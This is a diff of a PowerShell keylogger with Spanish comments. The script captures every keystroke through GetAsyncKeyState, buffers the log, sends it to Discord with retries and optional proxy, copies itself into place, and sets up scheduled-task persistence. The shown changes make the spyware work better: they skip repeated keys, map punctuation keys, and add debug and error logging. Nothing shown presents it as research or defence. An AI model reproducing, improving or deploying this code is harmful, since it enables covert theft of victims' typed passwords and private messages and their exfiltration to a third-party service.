@@ -13,8 +13,8 @@ try {
     if (-not [string]::IsNullOrEmpty($PSCommandPath) -and $PSCommandPath -ne $scriptPath) {
         Copy-Item $PSCommandPath $scriptPath -Force -ErrorAction Stop
         Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Script copiado a $scriptPath a $(Get-Date)" -ErrorAction Stop
-    } elseif ([string]::IsNullOrEmpty($PSCommandPath)) {
-        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[WARN] Ejecutando en modo interactivo; saltando copia a $(Get-Date)" -ErrorAction Stop
+    } else {
+        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Script ya en $scriptPath o ejecutado interactivamente a $(Get-Date)" -ErrorAction Stop
     }
 } catch {
     Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Copia de script falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
@@ -55,7 +55,8 @@ $keyMap = @{
     8='[BACKSPACE]'; 9='[TAB]'; 13='[ENTER]'; 16='[SHIFT]'; 17='[CTRL]'; 18='[ALT]';
     27='[ESC]'; 32=' '; 48='0'; 49='1'; 50='2'; 51='3'; 52='4'; 53='5'; 54='6'; 55='7'; 56='8'; 57='9';
     65='A'; 66='B'; 67='C'; 68='D'; 69='E'; 70='F'; 71='G'; 72='H'; 73='I'; 74='J'; 75='K'; 76='L'; 77='M';
-    78='N'; 79='O'; 80='P'; 81='Q'; 82='R'; 83='S'; 84='T'; 85='U'; 86='V'; 87='W'; 88='X'; 89='Y'; 90='Z'
+    78='N'; 79='O'; 80='P'; 81='Q'; 82='R'; 83='S'; 84='T'; 85='U'; 86='V'; 87='W'; 88='X'; 89='Y'; 90='Z';
+    186=';'; 187='='; 188=','; 189='-'; 190='.'; 191='/'; 192='`'; 219='['; 220='\'; 221=']'; 222="'"
 }
 
 # Función para enviar a Discord
@@ -85,12 +86,15 @@ function Send-ToDiscord {
                 if ($proxy) { $params.Proxy = $proxy }
                 Invoke-RestMethod @params
                 try { Add-Content -Path $logFile -Value "[INFO] Enviado a Discord a $(Get-Date)" -ErrorAction Stop } catch {}
+                try { Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Enviado a Discord a $(Get-Date)" -ErrorAction Stop } catch {}
                 break
             } catch {
                 $retryCount++
                 try { Add-Content -Path $logFile -Value "[ERROR] Intento $retryCount de $maxRetries falló: $_ a $(Get-Date)" -ErrorAction Stop } catch {}
+                try { Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Intento $retryCount de $maxRetries falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue } catch {}
                 if ($retryCount -eq $maxRetries) {
                     try { Add-Content -Path $logFile -Value "[ERROR] No se pudo enviar tras $maxRetries intentos a $(Get-Date)" -ErrorAction Stop } catch {}
+                    try { Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] No se pudo enviar tras $maxRetries intentos a $(Get-Date)" -ErrorAction Stop } catch {}
                     break
                 }
                 Start-Sleep -Seconds (5 * [math]::Pow(2, $retryCount-1))
@@ -102,6 +106,7 @@ function Send-ToDiscord {
 # Configurar persistencia
 try {
     $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Verificación de tarea completada: $(if ($taskExists) {'Tarea existe'} else {'Tarea no existe'}) a $(Get-Date)" -ErrorAction Stop
 } catch { 
     $taskExists = $null 
     Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Verificación de tarea falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
@@ -138,6 +143,7 @@ public class Keyboard {
     Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Add-Type falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
 }
 $logBuffer = @()
+$lastKeyStates = @{}
 while ($true) {
     Start-Sleep -Milliseconds 60
     $shift = [Keyboard]::GetAsyncKeyState(160) -eq -32767 -or [Keyboard]::GetAsyncKeyState(161) -eq -32767
@@ -145,7 +151,7 @@ while ($true) {
     $alt = [Keyboard]::GetAsyncKeyState(164) -eq -32767 -or [Keyboard]::GetAsyncKeyState(165) -eq -32767
     foreach ($i in (8..90 + 96..122 + 186..222)) {
         $keyState = [Keyboard]::GetAsyncKeyState($i)
-        if ($keyState -eq -32767) {
+        if ($keyState -eq -32767 -and $lastKeyStates[$i] -ne -32767) {
             $prefix = if ($shift) { "[SHIFT+]" } elseif ($ctrl) { "[CTRL+]" } elseif ($alt) { "[ALT+]" } else { "" }
             $char = if ($keyMap.ContainsKey($i)) { $keyMap[$i] } else { "[UNK+$i]" }
             $log = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $prefix$char"
@@ -160,6 +166,7 @@ while ($true) {
                 }
             }
         }
+        $lastKeyStates[$i] = $keyState
     }
     if ($logBuffer.Count -gt 0 -and ((Get-Date) -gt (Get-Date).Date.AddDays(1))) {
         try { 
@@ -179,6 +186,8 @@ while ($true) {
                 Clear-Content -Path $logFile -ErrorAction Stop
                 $sentToday = $true
                 Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Log enviado y limpiado a $(Get-Date)" -ErrorAction Stop
+            } else {
+                Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] No hay contenido para enviar a Discord a $(Get-Date)" -ErrorAction Stop
             }
         } catch { 
             Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Fallo en envío o limpieza: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
